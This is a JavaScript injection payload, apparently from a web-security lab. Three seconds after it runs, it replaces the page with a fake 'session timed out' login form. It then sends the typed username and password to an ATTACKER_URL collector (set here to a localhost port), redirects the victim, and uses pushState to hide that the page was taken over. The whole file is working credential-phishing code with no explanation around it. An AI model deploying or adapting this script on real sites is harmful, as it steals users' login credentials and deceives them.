EVIL_HTML = `
<html>
<head>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.2/css/bootstrap.min.css" integrity="sha384-Smlep5jCw/wG7hdkwQ/Z5nLIefveQRIY9nfy6xoR1uRYBtpZgI6339F5dgvm/e9B"
    crossorigin="anonymous">
</head>
<body>
  <div class="container">
    <h2>Sorry, your session timed out.</h2>
    <p>Please log in again.</p>
    <form id="refreshSession">
      username: <input type="text" class="form-control" name="username" required><br>
      password: <input type="password" class="form-control" name="password" required><br>
      <input type="submit" class="btn btn-primary" value="Submit">
    </form>
  </div>
</body>
</html>
`

function pwn() {
  document.documentElement.innerHTML = EVIL_HTML;
  const ATTACKER_URL = 'http://127.0.0.1:8081/creds';
  const form = document.getElementById('refreshSession');

  form.addEventListener("submit", function (event) {
    event.preventDefault(); // don't submit the default way
    const fd = new FormData(form);

    // make sure we capture all special characters without ambiguity
    const username = encodeURIComponent(fd.get('username'));
    const password = encodeURIComponent(fd.get('password'));
    fetch(`${ATTACKER_URL}?username=${username}&password=${password}`);

    // unPwn the page
    window.location = window.location.origin;
  });
}

// schedule page takeover
setTimeout(pwn, 3 * 1000);

// hide that we injected the page
window.history.pushState(null, '', '/');
